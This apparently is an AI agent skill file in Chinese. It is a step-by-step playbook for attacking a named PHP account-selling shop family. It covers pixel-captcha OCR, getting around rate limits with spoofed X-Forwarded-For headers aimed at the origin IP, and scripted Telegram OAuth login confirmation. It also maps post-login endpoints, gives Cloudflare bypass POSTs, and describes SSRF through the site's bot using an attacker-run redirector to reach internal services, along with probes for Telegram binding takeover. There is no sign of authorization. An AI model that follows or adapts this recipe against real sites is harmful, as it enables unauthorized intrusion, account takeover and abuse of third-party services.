---
name: pixel-captcha-shop-takeover
description: Use when a faka shop uses pixel captcha or TG OAuth.
---

# 像素验证码发卡站账号接管链

针对自研 PHP 发卡/账号商城（acc911.com 家族）：验证码为固定网格像素字，注册按 IP 限流但信任 XFF，登录可用 Telegram 新版 OAuth。

## 1. 像素验证码本地 OCR（零延迟、零误判）

**识别特征**：150x50 PNG，4 个字符颜色和位置固定，字模为标准 5x7 点阵（每点 4x4 像素）。

先用 PIL 统计主色确认调色板与 bbox：
```python
from PIL import Image; import numpy as np
im = Image.open("captcha.png").convert("RGB"); a = np.array(im)
# 字模色通常与干扰线色不同（干扰线是浅色变体），按精确色掩码即可分离
```

**acc911 参数**（同类模板可类推）：
- 字模色：棕(138,61,15) 蓝(29,78,216) 绿(15,118,110) 紫(109,40,217)
- bbox：x=14/48/82/116，y=8..35（20x28）
- 4x4 分块 → 5x7 位图，与标准 5x7 字库精确比对

完整实现见 `scripts/captcha_5x7.py`。**不要用 vision/tesseract**：8/B、S/5、O/0、G/6 极易读错；点阵精确匹配距离恒为 0。

## 2. 注册限流绕过（XFF 信任）

应用用 `X-Forwarded-For`/`X-Real-IP`/`CF-Connecting-IP` 判定客户端 IP。

- 走源站 80 端口默认 vhost（`Host: <IP>`），避开 Cloudflare
- 每个请求携带同一个伪造公网 IP 的三个头
- 配合本地 OCR 一次注册成功；同一代理 IP 反复注册会命中真实限流

```python
H = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip, "CF-Connecting-IP": fake_ip}
```

## 3. 表单与 CSRF

- 全站 `acc911_csrf` 是**静态** 64hex（所有用户相同），POST 必须带 `X-CSRF-Token: <该值>`
- 验证码 token：`GET /captcha/refresh`（带 X-CSRF-Token 头）→ `{"token":...}`，图片 `/captcha.png?t=<token>`
- 注册字段：username/email/password/confirm/tg_username/captcha/captcha_token/website(蜜罐置空)
- 登录字段：email/password/captcha/captcha_token/website

## 4. Telegram 新版 OAuth（oauth.telegram.org）

传统 AcceptLoginToken 对 qtoken 无效（AUTH_TOKEN_INVALID1）；正确链路：

1. 站点 `/tg-login` → 302 `https://oauth.telegram.org/auth?...`（含 state/code_challenge）
2. `GET /auth/auth?<q>&force_qr=1`，页面里 `setToken('<qtoken>')`、`tg://resolve?domain=oauth&startapp=<qtoken>`
3. Telethon：`RequestMainWebViewRequest(peer=@oauth, bot=InputUser, platform='android', start_param=qtoken)` → URL fragment 里含签名 `tgWebAppData`（含 start_param）
4. `GET https://webappinternal.telegram.org/oauth?tgWebAppStartParam=<qtoken>` 拿 `ajInit({"apiUrl":"/oauth/api?hash=..."})`
5. `POST https://webappinternal.telegram.org/oauth/api?hash=<h>` body `method=auth&_auth=<initData>` → 返回 `{"ok":true,"api_url":"/oauth/api?hash=<h2>"}`
6. `POST .../oauth/api?hash=<h2>` body `method=confirm&qtoken=<qtoken>&accept_allow_phone=false&accept_allow_write=true` → `{"ok":true}`
7. 轮询 `oauth.telegram.org/auth/login?...&qtoken=` → `{"status":"confirmed"}` → `GET /auth/push?` 拿 302 回调
8. 回调到站点带 code；**若站点换 token 报错（invalid_client/授权校验失败），说明站点侧 PKCE/密钥配置坏了**，TG 登录不可用

要求 20 秒内完成（qtoken 会轮换，出现 `refresh` 需重来）。脚本：`scripts/tg_oauth_confirm.py`。

## 5. 登录后的高价值面

- `GET /api/pick?platform=fb&page=1&per=100&show_sold=0` → 自选号库存（uid/年份/好友/2FA/国家/价格/profile_url），`show_sold=1` 看已售
- `POST /order/create`（goods_id/sku_id/qty/coupon/csrf）→ 302 `/order/<10位>?tk=<32hex>`
- `GET /order/<10位>` **匿名可读**（订单号随机 base36 36^10，不可枚举）
- `/user/recharge` → `/pay/epay/<订单号>`，回调 `/api/epay/callback`（MD5 签名，密钥随机）
- 会话 cookie 形如 base64(`uid:expiry:64hex HMAC`)，HMAC 密钥随机时无法伪造

## 6. 常见死路（别浪费时间）

- 会话 cookie `acc911_sid` 带 **Secure** 属性：走 HTTPS（acc911.com 经 CF）登录和访问。**但会话绑定出口 IP（2026-10 实测修正）：换任何代理 IP 立刻 302 回登录页；注册/登录/用户区/下单必须固定同一个代理一气做完**。走源站 HTTP 时必须 `set(secure=False)` 才带 cookie。
- **POST 绕过 CF 的正确链路：** CF 对 `POST /order/create`、`POST /selfselect/order` 弹 5 秒盾，但**源站 HTTP 不过 CF**——用 `http://<源站IP>` + 会话 cookie（secure=False）+ 伪造 `X-Forwarded-For/X-Real-IP/CF-Connecting-IP`，POST 直接成功（实测建单 302 → `/order/<no>?tk=<32hex>`）。
- **经济面全部有服务端校验（2026-10 实测）：** 优惠码 `acc911`（满 200 减 20）对 $0.02 订单不生效；`qty=-1/-100/0/0.5` 全被钳制为 1；余额支付返回「余额不足」且余额不变。
- 登录有**账号级反欺诈**：同一账号试错几次后一律返回“用户名或密码错误”（密码正确也一样），不要继续盲爆破；新注册账号通常只有**首次登录**能建立可用会话，掉线后很难再登。
- **不要用 `/user/profile` 试空 `new_password`**：可能把密码改成空哈希，服务端又不接受空密码登录，账号直接报废。
- `/pick/order` 的 price 客户端传参 → 服务端重算，402
- `/user/profile` 加 balance/role/is_admin → 不落库
- 支付回调空签名/伪造 → 返回 fail
- 订单号随机，不可枚举
- nginx 对 `admin*` 前缀 404、WAF 拦 console/panel/gly/guanli → 后台真实路径另有其名（看 `static/css/admin.css` 是否 200 确认存在）
- 后台登录页含 Turnstile + 图形验证码（admin.css 注释可证）→ 即使找到前缀也难自动登录

## 7. 站内机器人 = 全回显 SSRF（本家族独有，优先打）

机器人（@acc911_bot 及同类）的「📱 验证码监控」功能：发 `号码----<URL>`，机器人会**服务端请求该 URL 并把响应体回显**。这是从目标机房内部伸手的 SSRF。

- 校验「仅支持公网 http/https」：`file://`、`127.0.0.1` 直写被拒
- 绕过：自建公网 nginx 加 `location = /r { if ($args ~ "^u=(.+)$") { return 302 $1; } }`，用 `http://<our-ip>/r?u=<内网URL>`；Go 客户端会跟随 302 进内网（用正则 `$args` 才能保留多参数，`$arg_u` 会在第一个 `&` 截断）
- 回显约 <4KB：548B nginx 404 会回显，22KB 应用 404 静默 → 只能读小响应（JSON/小文件）
- 命中验证：让机器人请求自己的 `/log?c=<唯一串>` 看 access.log（源 IP 是目标服务器）
- 内网实测：`localhost/api/goods` 命中真实应用（`127.0.0.1` 是另一 vhost 返回 nginx 404）；888/26487 是空 nginx
- 机器人常同时有「UID测活」（真查库/真测活，5 个真实 UID 中 4 个存活可证）——但输入仅限数字，参数化无注入

## 8. TG 绑定接管面

1. 登录态 `POST /user/tg-bind`（带 csrf）→ 302 `https://t.me/acc911_bot?start=<TOKEN>`
2. TG 里发 `/start <TOKEN>` → `✅ 绑定成功 账号: <username>`（机器人幂等，已绑定后任何 payload 都返回成功）
3. 绑定后「我的账号」显示余额/订单数，发货通知实时推送

- Token 为随机 5-5 结构（base62 解码与 uid 无关联），不可推导
- **`uid`/`user_id` 参数被服务端完全忽略**：带 `uid=1` 的 token 依然绑到会话自己的账号；且机器人会**无条件重绑**（新 token 直接覆盖旧绑定）
- 机器人有管理命令 `/stats` `/broadcast` `/balance`，返回「⛔ 仅管理员可用」——按 **TG 用户 ID** 鉴权，无法伪造
- 要测 `/start` 处理有无注入需**第二个未绑定 TG 号**；单号测试会被幂等短路

## 9. 免费代理缓存假命中（血泪教训）

大池子免费代理混有 squid 缓存，会把之前缓存过的 `/login.html`（约 12,495B）回给任意路径，伪造出大量「200 登录页」假命中。

- 判定真路由必须**双代理交叉验证**：真路由 200/302 稳定复现；应用 404 = 22KB「页面不存在」；nginx 拉黑 = 548B
- 加 `Cache-Control: no-cache` + 随机 query **挡不住**已缓存条目，必须换 2 个不同出口复测
- `pkill -f <marker>` 会匹配到自身 shell 命令行 → 用 `[p]attern` 写法
